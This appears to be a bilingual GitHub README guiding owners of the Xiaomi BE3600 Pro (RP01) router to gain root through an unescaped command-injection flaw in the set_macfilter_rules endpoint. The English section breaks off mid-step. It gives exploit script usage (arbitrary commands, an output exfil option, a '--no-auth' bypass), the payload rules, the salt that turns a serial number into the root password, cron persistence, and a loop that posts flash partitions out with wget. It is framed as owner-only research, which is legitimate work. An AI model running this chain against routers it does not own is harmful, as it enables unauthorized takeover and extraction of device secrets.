# Xiaomi BE3600 Pro (RP01) — Root / SSH Guide

**小米 BE3600 Pro 网线版（RP01）root / SSH 完整教程**

> **No disassembly · No UART · No downgrade · No xmir-patcher**
> **无需拆机 · 无需串口 · 无需降级 · 不依赖 xmir-patcher**

<a id="top"></a>

**🌐 Language / 语言：** [**简体中文**](#zh) · [**English**](#en)

---

<a id="zh"></a>

## 🇨🇳 简体中文

> **无需拆机 · 无需串口 · 无需降级 · 不依赖 xmir-patcher**
>
> 通过一个此前未被公开利用的命令注入漏洞 `api/xqsystem/set_macfilter_rules`，
> 在稳定版 1.0.67 上拿到完整 root shell。

---

### 目录

- [0. 适用性与风险](#0-适用性与风险)
- [1. 准备](#1-准备)
- [2. 三步速通](#2-三步速通给急性子)
- [3. 详细步骤](#3-详细步骤)
- [4. 原理](#4-原理这个漏洞到底是什么)
  - [4.5 另一条链 set_global_enable](#45-另一条链set_global_enable)（→ 独立文档）
- [5. 排错：四个必踩的坑](#5-排错四个必踩的坑)
- [6. FAQ](#faq-zh)
- [7. 附录](#7-附录)
- **[附：README_SET_GLOBAL_ENABLE.md](README_SET_GLOBAL_ENABLE.md)** —— 第二条链
  `set_global_enable` 的完整说明（调用链 / 载荷 / 60 份固件普查 / 用法）

---

### 0. 适用性与风险

#### 已验证环境

| 设备 | 型号 | 固件 | 验证来源 |
|---|---|---|---|
| 小米 BE3600 Pro **网线版** | **RP01** | MiWiFi 稳定版 **1.0.67** | 作者本人（内核 `Linux 5.4.213 armv7l`，2026-09）|
| 小米 BE3600 Pro **8 口网线版** | **RP02** | MiWiFi 稳定版 **1.0.46** | 社区用户实测反馈，已完成 SSH 获取 |

两台都是稳定版、都是网线版系列，且固件版本不同（1.0.46 / 1.0.67）都成立，
说明这个接口在多个版本上一直存在，不是某个版本的特例。

**未验证但可能适用的**：BE3600 Pro 非网线版、BE6500 Pro 等其它新型号。
如果你测成功了，欢迎提 issue 告诉我型号 + 固件版本，我会补进这张表。

> **本仓库现在有两条链**：
> `set_macfilter_rules` 是上面这张表（本页 §1–§7，脚本 `tools/exploit_set_macfilter_rules.py`）；
> 另一条 `set_global_enable` 下游是 `milog.sh` 而不是 `macfilter`，适用范围也不同
> —— 60 份官方固件普查里命中 12 个型号。两者**有重叠但不等价**，RP01 两条都通。
> 某条打不通时，换另一条试试。
>
> **第二条链的完整说明 → [README_SET_GLOBAL_ENABLE.md](README_SET_GLOBAL_ENABLE.md)**
> （调用链、三条实测陷阱、载荷、适用范围普查表、脚本用法）

#### 为什么 xmir-patcher 在这台机器上没用

xmir-patcher 的四个入口在 1.0.67 上**全部失效**，原因各不相同：

| 入口 | 注入参数 | 为什么失败 |
|---|---|---|
| `arn_switch` | `level` | 不在 `hackCheck` 白名单 → 特殊字符被拦 |
| `start_binding` | `uid` / `key` | 不在白名单 → 被拦 |
| `set_mac_filter` | `name` | **带 `?commonstr` 正则检查**，拦 `` ` `` `;` `\|` `$` `&` 等 |
| datacenter / `connect6.py` | 多参数探测 | 无可用入口 |

**本教程用的是另一个接口 `set_macfilter_rules`**（注意和 `set_mac_filter` 不是一个东西），
它读 `name` 参数时**没有正则检查**，这是关键差异。

#### 其他机型能用吗

需要满足两点：

1. 固件里注册了 `api/xqsystem/set_macfilter_rules` 这个接口
2. 该接口读 `name` 时走的是 2 参数 `formvalue`（不带正则）

RP01/1.0.67 已确认满足。其他机型请自行解包固件确认，或直接跑本教程的
`--probe` 只读验证（安全，只发一个 ping）。

#### 使用前提与风险

> **前提：你必须是该设备的所有者。** 本教程的正常路径需要提供设备的 WEB 管理密码，
> 这本身就是一道授权门槛。唯一能绕过它的 `--no-auth` 参数，脚本会**强制要求你确认设备所有权**，
> 非交互环境下必须显式加 `--confirm-owner` 才允许运行。

- 仅适用于**你自己拥有**的设备
- 可能导致**失去官方保修**
- 操作不当有**变砖**风险（按本教程操作不会，但请务必先做 [3.5 备份 flash](#35-备份-flash强烈建议)）
- 作者不对任何设备损坏、数据丢失负责

**请勿对不属于你的设备使用。** 在中国大陆，未经授权侵入他人计算机信息系统可能触犯
《刑法》第 285 条；该条第三款对"提供专门用于侵入的工具"亦有规定。
本仓库只分发**分析方法与自己编写的脚本，不含任何小米固件二进制文件**，
且利用过程需要目标设备的管理密码 —— 这些是刻意保留的边界。

本仓库内容以技术研究与设备管理为目的发布。若你所在辖区对固件逆向有额外限制，请自行评估。

---

### 1. 准备

**硬件/网络**

- 电脑与路由器在**同一局域网**（路由器默认网关 `192.168.31.1`）
- 电脑需能 ping 通 `192.168.31.1`

**软件**

- Python 3（macOS / Linux 自带）
- 本仓库的 `tools/` 目录

```bash
git clone https://github.com/perrywey/xiaomi-rp01-root.git && cd xiaomi-rp01-root
```

**你需要知道两件事**

| 信息 | 哪里找 |
|---|---|
| **路由器 WEB 管理密码** | 你第一次配置路由器时设的密码（网页/米家里设的）。**不是** WiFi 密码，也**不是**小米账号密码 |
| **设备序列号 SN** | 路由器底部标签，形如 `12345/A1B2C3D4E5F6`（**斜杠是 SN 的一部分**）。也可以在拿到 shell 后用 `nvram get SN` 查 |

> 没有设过 WEB 密码？脚本会尝试空密码，通常也能过。

---

### 2. 三步速通（给急性子）

```bash
# ① 算 root 密码（把 SN 换成你自己的）
python3 tools/calc_root_pwd.py 12345/A1B2C3D4E5F6

# ② 利用漏洞开启 SSH（把密码换成你的 WEB 管理密码）
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password 你的WEB密码

# ③ 登录（密码用 ① 算出来的 8 位）
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    root@192.168.31.1
```

成功会看到 `Welcome to XiaoQiang!` 的 BusyBox 横幅。

**强烈建议继续做 [3.4 持久化](#34-持久化重启后还能进来) 和 [3.5 备份 flash](#35-备份-flash强烈建议)。**

---

### 3. 详细步骤

#### 3.1 算 root 密码

小米在路由器首次开机时用 `mkxqimage -I` 生成 root 密码并写入 `/etc/shadow`，
算法是 `MD5(SN + 固定盐)` 的前 8 位。本地即可计算：

```bash
python3 tools/calc_root_pwd.py 12345/A1B2C3D4E5F6
```

输出：

```
SN      : 12345/A1B2C3D4E5F6
用户名  : root
密码    : xxxxxxxx
```

想确认算法可信？跑自测（与固件自带的 `mkxqimage` 在 qemu 中真实运行的输出比对）：

```bash
python3 tools/calc_root_pwd.py --selftest
```

> **仅用于找回你自己设备的 root 密码。** SN 可以直接推导出该设备的 root 密码，
> 所以**不要把 SN 或算出的密码分享给他人** —— 教程示例里的 SN 是虚构的占位符。

#### 3.2 利用漏洞开启 SSH

```bash
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password 你的WEB密码
```

脚本默认执行三条命令（生成 hostkey → 启动 dropbear）：

```sh
mkdir -p /etc/dropbear
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
/usr/sbin/dropbear -p 22
```

看到 `响应: {"code":0}` 就成了。验证：

```bash
nc -vz 192.168.31.1 22      # 应显示 succeeded
```

> **不确定漏洞在你机器上是否成立？先做只读验证**（只发一个 ping，不改动任何东西）：
> ```bash
> sudo tcpdump -i any icmp &          # 另开一个终端看包
> python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password 你的WEB密码 --probe
> ```
> 收到来自 `192.168.31.1` 的 ICMP 包即证明命令执行成功。

**其他用法**

| 命令 | 作用 |
|---|---|
| `--cmd 'id'` | 执行任意命令 |
| `--cmd 'uname -a' --exfil 192.168.31.100:8001` | 把命令输出回传到你的电脑 |
| `--no-auth` | 跳过登录直接打（会先要求你确认设备所有权） |
| `tools/exploit_set_global_enable.py` | **另一条链**的利用脚本，完整说明见 [README_SET_GLOBAL_ENABLE.md](README_SET_GLOBAL_ENABLE.md)（含 60 份固件普查出的适用范围）；**需要登录**，没有 `--no-auth` |

```bash
# 另一条链：RP01 两条都通，某条打不通时换另一条试试
python3 tools/exploit_set_global_enable.py --ip 192.168.31.1 --password 你的WEB密码
```

> 第二条链的参数与排错（陷阱表、为什么首行不能用 `|`、为什么 `upper()` 会吃掉字母取反）
> 都写在 [README_SET_GLOBAL_ENABLE.md](README_SET_GLOBAL_ENABLE.md) 里，这里不重复。

> `--no-auth` 绕过了"需要提供 WEB 密码"这个授权门槛，所以它**默认会停下来要你确认**
> 目标设备为你本人所有；在脚本/管道等非交互环境里，必须显式加 `--confirm-owner` 才会执行。
> 这是刻意加的护栏，请不要为了方便而去掉它。

#### 3.3 登录

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    root@192.168.31.1
```

**那两个 `-o` 必须加** —— 路由器上的 dropbear 是 2017.75，只支持 SHA-1 的
`ssh-rsa` hostkey，而 OpenSSH 8.8+（macOS Monterey 之后自带）默认禁用它。
不加会报 `no matching host key type found`，看起来像被拒绝，其实是客户端不同意算法。

**省事配置**，加到 `~/.ssh/config`：

```
Host miwifi
    HostName 192.168.31.1
    User root
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel QUIET
```

之后只要 `ssh miwifi`。

#### 3.4 持久化（重启后还能进来）

> ✅ **持久化已由社区验证有效**：RP02 上实测"重启过一会就能再次进入 SSH"。
> 那个"过一会"正是 crontab 每分钟兜底触发的节奏（重启后最多等约 1 分钟）。
> 即使万一失效，你也可以重跑一次 3.2 恢复访问，不会被锁在外面。

**为什么需要它：** `/etc` 是内存文件系统，重启即丢。只有两个地方持久 ——
`nvram` 分区和 `/data`（ubifs）。而 `/etc/crontabs` 会被 bind-mount 到
`/data/etc/crontabs`，所以写 crontab 就能跨重启存活。

**在路由器 shell 里粘贴执行：**

```sh
mkdir -p /data/ssh /etc/dropbear
[ -s /data/ssh/host_key ] || cp /etc/dropbear/dropbear_rsa_host_key /data/ssh/host_key 2>/dev/null
[ -s /data/ssh/host_key ] || dropbearkey -t rsa -f /data/ssh/host_key
cp /data/ssh/host_key /etc/dropbear/dropbear_rsa_host_key
chmod 700 /etc/dropbear; chmod 600 /etc/dropbear/dropbear_rsa_host_key
cat > /data/ssh/boot.sh <<'BOOTEOF'
#!/bin/sh
mkdir -p /etc/dropbear
[ -s /etc/dropbear/dropbear_rsa_host_key ] || cp /data/ssh/host_key /etc/dropbear/dropbear_rsa_host_key
chmod 600 /etc/dropbear/dropbear_rsa_host_key
netstat -ltn 2>/dev/null | grep -q ':22 ' || /usr/sbin/dropbear -p 22
BOOTEOF
chmod 755 /data/ssh/boot.sh
mkdir -p /etc/crontabs
# ⚠️ 千万别用 echo '...' > /etc/crontabs/root 直接覆盖！
#    出厂 crontab 有 13 条任务（日志轮转、NTP 校时、温度保护等），覆盖后一并丢失。
#    下面是完整内容：保留出厂任务、去掉 OTA 预下载那行、末尾追加我们自己的。
cat > /etc/crontabs/root <<'CRONEOF'
*/5 * * * * command -v sp_check.sh >/dev/null && sp_check.sh
*/2 * * * * command -v logrotate >/dev/null && logrotate /etc/logrotate.conf
*/15 * * * * /usr/sbin/ntpsetclock 60 log >/dev/null 2>&1
* * * * * /usr/sbin/startscene_crontab.lua `/bin/date "+%u %H:%M"`
*/3 * * * * /usr/sbin/mobile_accel.sh check >/dev/null 2>&1
0 */6 * * * command -v sec_cfg_bak.sh >/dev/null && sec_cfg_bak.sh
* * * * * run-parts -a 1min /etc/periodic
*/5 * * * * run-parts -a 5min /etc/periodic
*/10 * * * * run-parts -a 10min /etc/periodic
3 * * * * run-parts -a hourly /etc/periodic
6 1 * * * run-parts -a daily /etc/periodic
*/30 * * * * /usr/sbin/cpu_temperature_protect.sh >/dev/null 2>&1
* * * * * /data/ssh/boot.sh
CRONEOF
chmod 600 /etc/crontabs/root
killall crond 2>/dev/null; sleep 1
/etc/init.d/cron restart 2>/dev/null || /usr/sbin/crond -c /etc/crontabs -b
nvram set ssh_en=1; nvram set telnet_en=1; nvram set uart_en=1; nvram commit
/data/ssh/boot.sh; sleep 1; netstat -ltn | grep ':22 '
```

最后应打印 `tcp 0 0 0.0.0.0:22 ... LISTEN`。

顺带把 hostkey 固化在 `/data/ssh/host_key`，以后重启 SSH 不会再报 host key 变更。

> **关于那份 crontab**：上面这份比出厂**少了一行** ——
> `1 3,4,5 * * * /usr/sbin/otapredownload`，那是小米每天凌晨 3/4/5 点的 OTA 预下载任务，
> 它内部的 `ota_upgrade()` 才是真正会拉新固件的通道（Web 后台的"自动升级"开关
> 改的只是 `otapred.settings.auto`）。去掉它可以避免某天夜里被静默升级，
> 详见 [FAQ](#faq-ota)。除了这一条，其余出厂任务都保留了。

#### 3.5 备份 flash（强烈建议）

这是你唯一的后悔药。**其中 `mtd16`（ART 无线校准）和 `mtd21`（bdata，含 SN/MAC/设备密钥）
一旦丢失，是任何官方固件都补不回来的** —— 没备份 = 刷砖即报废。

**电脑上运行接收端**（新开一个终端，别关）：

```bash
python3 tools/recv_backup.py ~/rp01_backup 8001
```

**路由器 shell 里：**

```sh
for m in 0 1 2 3 4 5 13 14 16 17 18 21; do dd if=/dev/mtdblock$m of=/tmp/m.bin bs=65536 2>/dev/null; base64 /tmp/m.bin > /tmp/m.b64; wget -q --post-file=/tmp/m.b64 -O /dev/null http://你的电脑IP:8001/mtd$m.b64; rm -f /tmp/m.bin /tmp/m.b64; done
```

（把 `你的电脑IP` 换成实际地址，如 `192.168.31.100`。）

电脑端会打印每个分区的大小和 `[OK]` / `[NG]` 校验结果，12 个全 `[OK]` 才算成功。

**为什么先 base64？** 见 [坑 4](#坑-4备份出来的文件只有几十字节)。

备份完成后，**再复制一份到网盘或移动硬盘**。放在同一台电脑里，机器和电脑一起出事就没了。

---

### 4. 原理：这个漏洞到底是什么

#### 4.1 调用链

```
POST /cgi-bin/luci/;stok=<TOKEN>/api/xqsystem/set_macfilter_rules
     mac=<合法MAC>&name=<载荷>&option=0
  │
  ├─ 控制器读 name：formvalue("name")        ← 2 参数，无正则检查
  │     而旧接口 set_mac_filter 是 formvalue("name", nil, "?commonstr") ← 有正则
  │
  ├─ XQSecureUtil.hackCheck 本该过滤特殊字符，
  │     但 "name" 在它的白名单里 → 直接放行，一个字符都不查
  │
  ├─ XQFirewall.setMacFilter(mac, name, "0", "")
  │
  └─ os.execute("/usr/sbin/macfilter add black <mac> rulename=<载荷>")
        ↑ 无转义，以 root 执行
```

#### 4.2 关键代码（解包后的 Lua）

`XQFirewall.lua`，拼接命令处：

```lua
L11 = "/usr/sbin/macfilter " .. L7 .. " " .. L8 .. " " .. A0
if A1 then
    L11 = L11 .. " rulename=" .. A1      -- A1 就是 name，未做任何转义
end
os.execute(L11)
```

`XQSecureUtil.lua` 的 `hackCheck`，白名单里有 `name`：

```lua
local whitelist = { name = 1, password = 1, ssid = 1, ... }
if whitelist[key] then return true end      -- 白名单命中 → 直接放行
-- 否则检查禁用字符类 [ ` ; | $ & \n ]
```

#### 4.3 载荷规则（实测得出）

| 字符 | 能否用 | 原因 |
|---|---|---|
| 换行 | ✅ | 白名单放行，控制器不切割 |
| 反引号 `` ` `` | ✅ | 同上 |
| `$( )` | ✅ | 同上 |
| `\|` `&` | ✅ | 同上 |
| **分号 `;`** | ❌ | 控制器用 `;` 把 `mac`/`name` 切成列表按下标配对，`;` 后面的内容会丢 |

其他必要条件：

- `option` 必须是 `0`（=add）。`option=1`（del）且 MAC 不在表里时会提前 return，不执行。
- `mac` 必须匹配 `^[0-9a-fA-F:;]+$` 且**不在现有 macfilter 表里**（脚本每次随机生成新 MAC 规避）。

#### 4.4 root 密码是怎么来的

`etc/init.d/system`：

```sh
set_user(){
    local inited=$(uci -q get xiaoqiang.common.INITTED)
    [ "$inited" != "YES" ] && {
        local init_pwd=`mkxqimage -I`              # ← 密码在这里生成
        [ -n "$init_pwd" ] && {
            (echo $init_pwd; sleep 1; echo $init_pwd) | passwd root
        }
    }
}
```

出厂配置里没有 `INITTED` 键，所以首次开机必然执行，`/etc/shadow` 里的 root 密码
就是 `mkxqimage -I` 的输出。`mkxqimage` 读 `nvram get SN`，算法为
`MD5(SN + "6d2df50a-250f-4a30-a5e6-d44fb0960aa0")` 的前 8 位。

#### 4.5 另一条链：set_global_enable

本仓库还有**第二条独立的链** —— `api/device_security/local_access/set_global_enable`。
它和 4.1 这条不是一回事，两条链的差别：

| | 本页这条（4.1） | 另一条（4.5） |
|---|---|---|
| 接口 | `api/xqsystem/set_macfilter_rules` | `api/device_security/local_access/set_global_enable` |
| 参数过滤 | `XQParam` / hackCheck | `formvalue()` 无参调用，取整个表 |
| 注入参数 | `rulename` | `mac` |
| 下游 sink | `os.execute("/usr/sbin/macfilter add black …")` | `os.execute("milog.sh -m '{…}'")` |
| 是否需要登录 | 可用 `--no-auth` | **必须登录**（sysauth=admin） |
| 适用范围 | RP01 / RP02 实测 | 60 份固件普查命中 12 个型号 |

**完整说明与利用脚本见 → [README_SET_GLOBAL_ENABLE.md](README_SET_GLOBAL_ENABLE.md)**

> RP01 两条链都通。某条打不通时，换另一条试试。

---

### 5. 排错：四个必踩的坑

#### 坑 1：telnetd 起不来（23 端口 refused）

小米给 busybox 的 `telnetd` **打了补丁**，启动时会读：

```
cat /proc/xiaoqiang/ft_mode
cat /usr/share/xiaoqiang/xiaoqiang_version | grep CHANNEL
bdata get telnet_en / nvram get telnet_en
```

稳定版（`CHANNEL=release`）下除非 `telnet_en=1` 或 `ft_mode=1`，否则**拒绝启动**。
闸在 busybox 二进制里，不在 `/etc/init.d/telnet` 脚本里 —— 所以改 init 脚本没用。

**解法：改用 dropbear**（`strings /usr/sbin/dropbear` 里没有这些检查，未打补丁）。

#### 坑 2：`dropbear -p 22 -R` 起不来

`/etc/dropbear/dropbear_rsa_host_key` 在固件里是个 **0 字节占位文件**，
而 `-R`（自动生成 hostkey）遇到已存在的文件**不会覆盖**，于是拿空 key 启动失败。

**解法：先删再显式生成**

```sh
rm -f /etc/dropbear/dropbear_rsa_host_key
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
/usr/sbin/dropbear -p 22
```

#### 坑 3：SSH 握手失败

```
Unable to negotiate with 192.168.31.1 port 22: no matching host key type found. Their offer: ssh-rsa
```

dropbear 2017.75 只有 SHA-1 的 `ssh-rsa`，OpenSSH 8.8+ 默认禁用。

**解法：** 加 `-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`。

#### 坑 4：备份出来的文件只有几十字节

busybox 的 `wget --post-file` **走 C 字符串，遇到 `0x00` 就截断**。
二进制分区第一个 NUL 处就被切掉，传出来全是残的。

最阴的是：恰好不含 NUL 的分区会**完整通过**，制造出"通路正常、只是个别分区有问题"的假象。
我就是靠核对分区大小表才发现的。

**解法：先 base64 再传**

```sh
base64 /tmp/m.bin > /tmp/m.b64     # 全 ASCII，无 NUL
```

校验也很简单：`512KB → 4×ceil(524288/3)=699,052` 字符 + `9,199` 个换行 = `708,251` 字节，
对得上就是完整的。

---

<a id="faq-zh"></a>

### 6. FAQ

**Q：路由器会从米家消失吗？**

不会。消失是因为把 `CHANNEL` 从 `release` 改成 `debug`（小米检测到开发版就踢出米家）。
本教程**完全不碰 CHANNEL**。而且这个机型 `/` 是只读 squashfs、`/usr` 上没有 overlay，
那个文件**想改也改不了**。

<a id="faq-ota"></a>

**Q：固件会自动升级吗？root 会丢吗？**

小米有两条升级通道，光关 Web 后台的"自动升级"**不够彻底**：

| 通道 | 机制 | 状态 |
|---|---|---|
| Web / 米家的"自动升级"开关 | 改的是 `otapred.settings.auto` | 关掉后不再自动下载安装 |
| **出厂 crontab 定时任务** | `1 3,4,5 * * * /usr/sbin/otapredownload` | 每天凌晨 3/4/5 点跑，内部 `ota_upgrade()` 会拉新固件 |

所以建议**两条都堵上**：

```sh
# 1. 确认开关已关（应为 0）
uci get otapred.settings.auto
# 不是 0 就执行：
uci set otapred.settings.auto=0; uci commit otapred

# 2. 去掉 crontab 里的 OTA 任务（3.4 节给的 crontab 已经去掉了）
grep otapredownload /etc/crontabs/root || echo "已移除"

# 3. 可选：DNS 层面屏蔽 OTA 服务器，双保险
uci add_list dhcp.@dnsmasq[0].address='/bigota.miwifi.com/0.0.0.0'
uci commit dhcp && /etc/init.d/dnsmasq restart
```

第 3 步会让 `bigota.miwifi.com`（小米 OTA 下载服务器）解析到 `0.0.0.0`，
即使前两步失效也下不到固件。**代价是你想主动升级时要先撤掉这条。**

**Q：重启后 SSH 还在吗？**

**在。** [3.4 持久化](#34-持久化重启后还能进来) 已由社区在 RP02 上实测验证：
重启后约 1 分钟内（crontab 每分钟兜底触发）dropbear 会自动起来，可以再次 SSH 登录。

万一在你的机器上没生效，重跑一次 3.2 即可恢复 —— 漏洞一直在，不会把你锁在外面。

**Q：官方 SSH 工具能用吗？**

不支持 RP01 这类新型号。

**Q：能降级到旧版本吗？**

不能。RP01 从发布至今只有 1.0.67 一个版本。

**Q：拿到 root 之后能做什么？**

看 WiFi 密码、关数据上报、装插件、去广告、备份/刷机……那是另一篇文章了。

**Q：SN 和密码能告诉别人吗？**

**不要。** SN 可以直接算出你设备的 root 密码。

---

### 7. 附录

#### 依赖关系

**本项目零第三方依赖。** 三个脚本只用 Python 3 标准库（`hashlib`、`http.server`、
`argparse`、`socketserver`、`base64`），不需要 `pip install` 任何东西。

刻意**不依赖** [xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher)，原因有三：

1. 该仓库**未声明开源许可证**（GitHub 显示 "No license"），法律上默认是"保留所有权利"。
   复制或合并其代码会带来许可风险 —— 本项目**没有复制它的任何一行代码**。
2. 本项目的目的恰恰是提供一条**不依赖它**的路径：xmir-patcher 的入口在 1.0.67 上全部失效。
3. 单文件、零依赖更利于使用者审计，也更容易长期存活。

#### 致谢与相关项目

本项目的分析受以下工作启发，特此致谢（均为链接引用，未复制任何代码）：

| 项目 | 与本项目关系 |
|---|---|
| [openwrt-xiaomi/xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher) | 小米路由器 root 生态的重要基础工作。本项目在其失效的场景（RP01 / 1.0.67）下提供替代路径，两者是互补而非竞争 |
| `unluac_miwifi`（NyaMisty 维护的 fork） | 反编译小米定制的 Lua 字节码，用于定位 `set_macfilter_rules` 的漏洞链 |
| [QEMU](https://www.qemu.org/) user-mode | 在 x86 机器上仿真固件自带的 ARM 二进制（Lua、busybox、dropbear），让每一环都能实测而非猜测 |
| [OpenWrt](https://openwrt.org/) | 小米固件基于其二次开发，分区布局与启动流程的分析基础 |

#### 文件说明

| 文件 | 作用 |
|---|---|
| `tools/calc_root_pwd.py` | 由 SN 计算 root 密码，含 14 组自测样本 |
| `tools/exploit_set_macfilter_rules.py` | 漏洞利用 —— `set_macfilter_rules` 链（单接口、自研、无自动探测） |
| `tools/exploit_set_global_enable.py` | 漏洞利用 —— `set_global_enable` 链（另一条链，见 [README_SET_GLOBAL_ENABLE.md](README_SET_GLOBAL_ENABLE.md)） |
| [`README_SET_GLOBAL_ENABLE.md`](README_SET_GLOBAL_ENABLE.md) | **第二条链的完整文档**：调用链、三条实测陷阱、载荷逐行注解、60 份固件普查、用法与排错 |
| `tools/recv_backup.py` | flash 备份接收端，自动 base64 解码 + 大小校验 |

#### 关于 xmir-patcher 的自动探测

**不建议**用它来验证漏洞是否成立。公开的 `connect6.py` 会实际发送多种探测参数，
一旦命中还会**设置 SSH、改 root 密码、启动服务** —— 不是只读扫描。
本教程的脚本是单接口单请求，可自行审查源码。

#### 分区表（RP01）

| 分区 | 大小 | 内容 | 备份优先级 |
|---|---|---|---|
| mtd0 / mtd1 | 1.5 MB | SBL1 ×2 | 高 |
| mtd2 | 1 MB | MIBIB 分区表 | 高 |
| mtd3 / mtd4 | 512 KB | BOOTCONFIG ×2 | 中 |
| mtd5 / mtd6 | 3.5 MB | QSEE ×2 | 中 |
| mtd14 / mtd15 | 1.5 MB | APPSBL (uboot) ×2 | 高 |
| **mtd16** | 2 MB | **ART 无线校准** | **最高** |
| mtd17 / mtd18 | 512 KB / 256 KB | TRAINING / LICENSE | 中 |
| mtd19 / mtd20 | 45 MB | rootfs A/B 双份 | 中 |
| **mtd21** | 512 KB | **bdata（SN / MAC / 密钥）** | **最高** |
| mtd23 | 47 MB | overlay（UBI，含 cfg/user/plugin） | 中 |

#### 关键挂载信息

```
/dev/mtdblock29  on /      squashfs  ro     ← 根只读，/usr 改不了
ubi23:cfg        on /data  ubifs     rw     ← 持久化靠它
```

---

### 免责声明

本仓库内容仅用于**研究与你本人拥有的设备**，请勿对未经授权的设备使用。
使用前请完整备份 flash，使用者自行承担全部风险与后果，
作者不对任何设备损坏、数据丢失或保修失效负责。

补充说明（有助于判断本仓库的性质）：

- 不包含任何第三方固件二进制，所有固件分析结论可由使用者自行解包复现
- 利用脚本需要目标设备的 WEB 管理密码；唯一绕过的 `--no-auth` 带有所有权确认护栏
- 无批量扫描、无横向移动、无持久化后门功能，仅面向单台设备
- 若权利方认为本仓库侵犯其权益，请通过 GitHub Issue 联系，会配合处理

**↑ [回到语言选择 / Back to language selector](#top)**

---

<a id="en"></a>

## 🇬🇧 English

By exploiting a previously unused command-injection endpoint,
`api/xqsystem/set_macfilter_rules`, this gets you a full root shell on the **stable**
firmware — no disassembly, no UART soldering, no downgrade, and no xmir-patcher.

### Table of Contents

- [0. Scope and Risks](#0-scope-and-risks)
- [1. Prerequisites](#1-prerequisites)
- [2. Quick Start](#2-quick-start-for-the-impatient)
- [3. Step by Step](#3-step-by-step)
- [4. How the Vulnerability Works](#4-how-the-vulnerability-works)
  - [4.5 The other chain: `set_global_enable`](#45-the-other-chain-set_global_enable) (→ separate doc)
- [5. Troubleshooting: Four Traps](#5-troubleshooting-four-traps)
- [6. FAQ](#faq-en)
- [7. Appendix](#7-appendix)
- **[Appendix: README_SET_GLOBAL_ENABLE.md](README_SET_GLOBAL_ENABLE.md)** — full write-up for
  the second chain `set_global_enable` (call chain / payload / 60-firmware census / usage)

---

### 0. Scope and Risks

#### Verified environments

| Device | Model | Firmware | Verified by |
|---|---|---|---|
| Xiaomi BE3600 Pro (wired version) | **RP01** | MiWiFi stable **1.0.67** | Author (kernel `Linux 5.4.213 armv7l`, 2026-09) |
| Xiaomi BE3600 Pro 8-port wired version | **RP02** | MiWiFi stable **1.0.46** | Community user report — SSH obtained successfully |

Both are stable channel, both from the wired-version product line, and the two firmware
versions differ (1.0.46 / 1.0.67) — so this endpoint has been present across releases,
rather than being specific to one build.

**Not verified, but may work:** the non-wired BE3600 Pro, BE6500 Pro, and other recent
models. If you succeed, please open an issue with your model + firmware version.

> **This repo now covers two chains**:
> `set_macfilter_rules` is the table above (this page, §1–§7, script
> `tools/exploit_set_macfilter_rules.py`); the other one, `set_global_enable`, sinks into
> `milog.sh` rather than `macfilter` and has a different scope — 12 models out of a
> 60-image official firmware census. They **overlap but are not equivalent**; RP01 works
> with both. If one fails, try the other.
>
> **Full write-up for the second chain → [README_SET_GLOBAL_ENABLE.md](README_SET_GLOBAL_ENABLE.md)**
> (call chain, three measured traps, payload, scope census, usage)

#### Why xmir-patcher doesn't work here

All four of its entry points fail on these devices, for different reasons:

| Entry point | Parameter | Why it fails |
|---|---|---|
| `arn_switch` | `level` | Not in the `hackCheck` whitelist → metacharacters blocked |
| `start_binding` | `uid`, `key` | Same — not whitelisted |
| `set_mac_filter` | `name` | Read via `formvalue("name", nil, "?commonstr")`; that regex blocks `` ` `` `;` `\|` `$` `&` `\|` and newline, so no usable payload survives |
| datacenter / `connect6.py` | multiple | No usable entry point found |

The `set_macfilter_rules` endpoint used here is **a different handler** from
`set_mac_filter`, despite the similar name.

#### Prerequisites and risks

> **You must own the device.** The normal path requires the router's WEB admin password,
> which is itself an authorization gate. The only way to bypass it (`--no-auth`) makes the
> script **stop and ask you to confirm ownership** first.

- For devices you own only
- Voiding your warranty is likely
- Risk of brick exists (follow the guide and back up first — [3.5](#35-back-up-the-flash-strongly-recommended))
- The author is not responsible for any damage

**Do not use this on devices you do not own.** This repository ships **analysis and
self-written scripts only — no third-party firmware binaries**, and the exploit requires
the target's admin password. Those boundaries are deliberate.

---

### 1. Prerequisites

- Your computer and the router on the **same LAN** (default gateway `192.168.31.1`)
- Python 3 (no third-party packages needed)

```bash
git clone https://github.com/perrywey/xiaomi-rp01-root.git && cd xiaomi-rp01-root
```

You need two things:

| Item | Where to find it |
|---|---|
| **Router WEB admin password** | The one you set during initial setup — **not** the WiFi password, **not** your Mi account password |
| **Serial number (SN)** | Sticker on the bottom of the router, e.g. `12345/A1B2C3D4E5F6` (the **slash is part of the SN**). You can also run `nvram get SN` once you have a shell |

---

### 2. Quick Start (for the impatient)

```bash
# 1. Calculate the root password (use your own SN)
python3 tools/calc_root_pwd.py 12345/A1B2C3D4E5F6

# 2. Exploit: start SSH (use your WEB admin password)
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password YOUR_WEB_PASSWORD

# 3. Log in (password = the 8 chars from step 1)
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    root@192.168.31.1
```

On success you'll see the `Welcome to XiaoQiang!` BusyBox banner.

**Please continue with [3.4 persistence](#34-persistence-surviving-reboots) and
[3.5 flash backup](#35-back-up-the-flash-strongly-recommended).**

---

### 3. Step by Step

#### 3.1 Calculate the root password

Xiaomi generates the root password on first boot with `mkxqimage -I` and writes it to
`/etc/shadow`. The algorithm is the first 8 hex chars of `MD5(SN + fixed salt)`, so you
can compute it offline:

```bash
